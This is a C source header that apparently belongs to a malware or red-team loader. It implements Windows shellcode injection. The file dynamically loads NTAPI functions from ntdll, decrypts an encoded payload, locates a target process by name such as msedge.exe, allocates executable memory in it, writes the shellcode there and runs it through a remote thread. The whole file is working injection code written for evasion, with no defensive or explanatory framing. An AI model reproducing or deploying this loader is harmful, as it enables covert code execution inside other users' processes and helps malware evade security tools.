#pragma once 

#include <windows.h>
#include <winternl.h> 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include "../debug_print/debug_print.h"


// Define success and error codes
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

// For initializing OBJECT_ATTRIBUTES
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

// Function pointers for NTAPI functions
typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* pfnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CLIENT_ID*);
typedef NTSTATUS (NTAPI* pfnNtClose)(HANDLE);
typedef NTSTATUS (NTAPI* pfnRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, CLIENT_ID*);
typedef NTSTATUS (NTAPI* pfnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

// Declare global pointers to functions
pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
pfnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
pfnNtOpenProcess pNtOpenProcess = NULL;
pfnNtClose pNtClose = NULL;
pfnRtlCreateUserThread pRtlCreateUserThread = NULL;
pfnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

// Function to dynamically load NTAPIs
void LoadAPIs() {
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");

    pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pNtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
    pRtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
    pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
}

void custom_decrypt(unsigned char *buf, const int buf_length) {
	for(int i = 0; i < buf_length; i++) {
		buf[i] = buf[i] - 0xFE;
	}	
}


int FindTarget(const wchar_t* target_process) {

    PVOID buffer = NULL;
    ULONG buffer_size = 0x10000;
    ULONG needed_size = 0;

    buffer = malloc(buffer_size);
    if (!buffer) {
        return 1;
    }

    NTSTATUS status;
    // Reallocate buffer as needed
    while ((status = pNtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
        buffer_size = needed_size;
        buffer = realloc(buffer, buffer_size);
    }

    if (!NT_SUCCESS(status)) {
        free(buffer);
        return 0;
    }

    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    int pid = 0;

    do {
		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, target_process) == 0) {
			pid = (int)spi->UniqueProcessId;
			break;
		}
		spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
	} while (spi->NextEntryOffset != 0);

	free(buffer);
	return pid;

}

// payload_info format:     msedge.exe
// the name specifies the process to inject the shellcode into.
void inject_shellcode_procname_dyn_lib_NTAPI(unsigned char *shellcode, int shellcode_size, char *payload_info) {
    DEBUG_PRINT("Starting inject_shellcode_procname_dyn_lib with NTAPIs routine...\n");  
    
    
    int target_pid = 0;
    wchar_t target_process[256]; // Assuming payload_info is less than 256 characters
    mbstowcs(target_process, payload_info, 256); // Convert char* to wchar_t*


    // Setup for calling NtOpenProcess
    HANDLE hProc;
    OBJECT_ATTRIBUTES object_attributes;
    CLIENT_ID clientId;

    DEBUG_PRINT("Loading dynamically NTAPIs...\n");    
    LoadAPIs();
    // Check initialization
    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtOpenProcess || !pNtClose || !pRtlCreateUserThread || !pNtQuerySystemInformation) return; 


    DEBUG_PRINT("Extracted payload_info::process_name argument = %s\n", target_process);

    DEBUG_PRINT("Finding target PID...\n");
    target_pid = FindTarget(target_process);

    if (target_pid == 0){
        DEBUG_PRINT("Failed to find PID of targeted process.\n");
        return;
    }

    clientId.UniqueProcess = (HANDLE)target_pid;
    clientId.UniqueThread = 0;

    InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);

    // Access target process
    DEBUG_PRINT("Accessing target process...\n");
    NTSTATUS status = pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);

    if(hProc == NULL) {
        DEBUG_PRINT("Failed to retrieve handle.\n");
        return;
    }

    // Allocate target memory for the shellcode
    DEBUG_PRINT("Allocating memory in target process...\n");
    PVOID pRemoteCode = NULL;
    SIZE_T ulSize = shellcode_size;

    status = pNtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &ulSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)){
        DEBUG_PRINT("Memory allocation failed.\n");
        return;    
    }

    DEBUG_PRINT("Decrypting payload\n");
    // Decrypt payload
    custom_decrypt(shellcode, shellcode_size);

    // Write shellcode into allocated target buffer
    DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
    ULONG bytesWritten;
    status = pNtWriteVirtualMemory(hProc, pRemoteCode, shellcode, shellcode_size, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != shellcode_size){
        DEBUG_PRINT("Write operation failed.\n");
        return;
    }
    
    // Create and start new thread in the remote process, executing the shellcode
    DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
    HANDLE hThread = NULL;
    status = pRtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, pRemoteCode, NULL, &hThread, NULL);
    if (!NT_SUCCESS(status) || hThread == NULL){
        DEBUG_PRINT("Thread creation failed.\n");
        return;
    }

    CloseHandle(hProc);
}
